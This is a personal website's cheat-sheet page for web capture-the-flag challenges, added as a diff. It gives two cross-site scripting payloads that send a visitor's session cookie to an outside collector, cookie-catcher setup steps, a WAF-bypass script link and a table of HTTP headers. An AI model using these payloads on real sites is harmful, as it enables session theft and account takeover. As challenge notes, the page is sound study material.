@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="en">
+
+	<head>
+		<meta charset="utf-8">
+		<meta name="description" content="Siddarth's Website">
+		<meta name="author" content="Siddarth Senthilkumar">
+		<meta name="msapplication-TileColor" content="#ffffff">
+		<meta name="msapplication-TileImage" content="../images/icons/name-logo.png">
+		<link href="../css/custom.css" rel="stylesheet">
+        <link rel="icon" href="../images/icons/name-logo.png">
+
+        <!--Let browser know website is optimized for mobile-->
+        <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+        <!--Import Google Icon Font-->
+        <link href="http://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+        <!--Import materialize.css-->
+        <link type="text/css" rel="stylesheet" href="../css/materialize.min.css"  media="screen,projection"/>
+
+	    <title>Sid | Web Security</title>
+	</head>
+
+	<body>
+        <main>
+            <!-- Navigation bar -->
+            <nav>
+                <div class="nav-wrapper grey darken-4">
+                    <a href="#" data-activates="mobile-demo" class="button-collapse"><i class="material-icons">menu</i></a>
+                    <ul class="left hide-on-med-and-down nav-bar">
+                        <li><a href="../index.html">Home</a></li>
+                        <li><a href="../projects.html">Projects</a></li>
+                        <li><a href="../writeups.html" class="active">Writeups</a></li>
+                        <li><a href="../courses.html">Coursework</a></li>
+                        <li><a href="../resources/Sids-Resume.pdf" target="_blank">Résumé / CV</a></li>
+                    </ul>
+                    <ul class="right hide-on-med-and-down nav-bar">
+                        <li><a href="../greyhat.html">GreyHat</a></li>
+                    </ul>
+                    <ul class="side-nav nav-bar" id="mobile-demo">
+                        <li><a href="../index.html">Home</a></li>
+                        <li><a href="../projects.html">Projects</a></li>
+                        <li><a href="../writeups.html" class="active">Writeups</a></li>
+                        <li><a href="../courses.html">Coursework</a></li>
+                        <li><a href="../greyhat.html">GreyHat</a></li>
+                        <li><a href="../resources/Sids-Resume.pdf">Résumé / CV</a></li>
+                    </ul>
+                </div>
+            </nav>
+
+            <!-- Page Body -->
+            <div class="container">
+                <h3>Web</h3>
+                <hr>
+                <div class="row">
+                    <div class="col s12 m12 l12">
+                        Here are some useful scripts and tools for web challenges.
+                        <h5>Table of Contents</h5>
+                        <hr>
+                        <ol type="I">
+							<li><a href="#xss">Cross Site Scripting (XSS)</a></li>
+							<li><a href="#http">HTTP Header Modification</a></li>
+                        </ol>
+                    </div>
+                </div>
+                <div class="row">
+                    <div class="col s12 m12 l12">
+                        <a name="xss"></a>
+                        <h5>Cross Site Scripting / XSS</h5>
+						<hr>
+						With cross-site scripting, you aim to steal session cookies of an admin or other important user. You can do this by posting JavaScript that redirects someone who visits the website to a website you own. Just send the cookie as a parameter in the GET request.
+<pre><code class="html">1. No Filtering
+&lt;script&gt;
+location.href=("https://requestb.in/some_session?c="+document.cookie)
+&lt;/script&gt;
+
+2. Image OnError
+&lt;img src="" onerror="location.href=('http://192.168.1.163?c=' + document.cookie)"&gt;&lt;/img&gt;
+</code></pre>
+
+						<a href="https://requestb.in/" target="_blank">https://requestb.in/</a> is a great website for easily capturing HTTP requests.<br />
+						If you need specific response type, use <a href="https://httpbin.org/" target="_blank">https://httpbin.org/</a>.<br />
+						In the case that the server visiting your IP is network restricted or needs a specific HTTP response, you can set-up your own cookie catcher using <a href="../resources/scripts/cookie_catcher.py" target="_blank">cookie_catcher.py</a> or as follows:
+<pre><code>virtualenv -p python3 venv
+source venv/bin/activate
+pip install xss_catcher
+xss_catcher
+</code></pre>
+                    </div>
+				</div>
+				<div class="row">
+					<div class="col s12 m12 l12">
+						<a name="http"></a>
+						<h5>HTTP Headers</h5>
+						<hr>
+                        These are some of the interesting HTTP headers and what they do. A full list can be found here: <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers" target="_blank">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers</a>
+                        <table class="striped">
+                            <thead>
+                              <tr>
+                                  <th>Header</th>
+                                  <th>Purpose</th>
+                                  <th>Example</th>
+                              </tr>
+                            </thead>
+
+                            <tbody>
+                              <tr>
+                                <td>X-Forwarded-For</td>
+                                <td>Identifies originating IP address of a client connecting to a web server through an HTTP proxy or load balancer. Brute force WAF with <a href="../resources/scripts/waf_bypass.py" target="_blank">waf_bypass.py</a></td>
+                                <td>X-Forwarded-For: 192.168.101.13</td>
+                              </tr>
+                              <tr>
+                                <td>X-Remote-IP</td>
+                                <td>Identifies originating IP address of a client connecting to a web server through an HTTP proxy or load balancer.</td>
+                                <td>X-remote-IP: 192.168.101.13</td>
+                              </tr>
+                              <tr>
+                                <td>X-Originating-IP</td>
+                                <td>Identifies originating IP address of a client connecting to a web server through an HTTP proxy or load balancer.</td>
+                                <td>X-originating-IP: 192.168.101.13</td>
+                              </tr>
+                              <tr>
+                                <td>X-Client-IP</td>
+                                <td>Identifies originating IP address of a client connecting to a web server through an HTTP proxy or load balancer.</td>
+                                <td>X-Client-IP: 192.168.101.13</td>
+                              </tr>
+                              <tr>
+                                <td>X-Remote-Addr</td>
+                                <td>Identifies originating IP address of a client connecting to a web server through an HTTP proxy or load balancer.</td>
+                                <td>X-remote-Addr: 192.168.101.13</td>
+                              </tr>
+                              <tr>
+                                  <td>X-Forwarded-Host</td>
+                                  <td>Identifies the original host requested by the client in the HOST header.</td>
+                                  <td>X-Forwarded-Host: id42.example-cdn.com</td>
+                              </tr>
+                              <tr>
+                                  <td>Cookie</td>
+                                  <td>User cookies</td>
+                                  <td>Cookie: key1=value1; key2=value2;</td>
+                              </tr>
+                              <tr>
+                                  <td>Host</td>
+                                  <td>The website trying to be reached. Needed because the requested page may be different from the load balancer / root IP address.</td>
+                                  <td>Ex: cnn.com</td>
+                              </tr>
+                              <tr>
+                                  <td>Origin</td>
+                                  <td>Discloses where a fetch came from. Doesn't disclose the whole path.</td>
+                                  <td>Origin: https://developer.mozilla.org</td>
+                              </tr>
+                              <tr>
+                                  <td>Referer</td>
+                                  <td>Contains address of previous web page from which link to currently requested page was followed.</td>
+                                  <td>Referer: https://developer.mozilla.org/en-US/docs/Web/JavaScript</td>
+                              </tr>
+                              <tr>
+                                  <td>From</td>
+                                  <td>If a human creates a bot to scrape something, they should make the bot include a From header in its requests, containing the human's email. This way, a website owner can contact the human if the bot is destructive.</td>
+                                  <td>From: webmaster@example.org</td>
+                              </tr>
+                            </tbody>
+                          </table>
+					</div>
+				</div>
+            </div>
+        </main>
+
+        <!-- Contact Me -->
+        <footer class="page-footer grey darken-4">
+            <div class="container">
+                <div class="center-align row">
+                    <div class="col s12 m12 l12">
+                        <ul class="contact">
+                            <li><a class="waves-effect waves-light btn light-blue" href="https://github.com/sidsenkumar11" target="_blank">GitHub</a></li>
+                            <li><a class="waves-effect waves-light btn light-blue" href="https://linkedin.com/in/sidsenkumar11" target="_blank">LinkedIn</a></li>
+                            <li><a class="waves-effect waves-light btn light-blue" href="mailto:sidsenkumar11@gmail.com" target="_blank">E-Mail</a></li>
+                            <li><a class="waves-effect waves-light btn light-blue" href="resources/Sids-Resume.pdf" target="_blank">Resume</a></li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </footer>
+
+        <!--Import jQuery before materialize.js-->
+        <script type="text/javascript" src="https://code.jquery.com/jquery-2.1.1.min.js"></script>
+        <script type="text/javascript" src="../js/materialize.min.js"></script>
+        <script type="text/javascript" src="../js/custom.js"></script>
+        <link rel="stylesheet" href="../highlight/styles/vs2015.css">
+        <script src="../highlight/highlight.pack.js"></script>
+        <script>hljs.initHighlightingOnLoad();</script>
+	</body>
+</html>
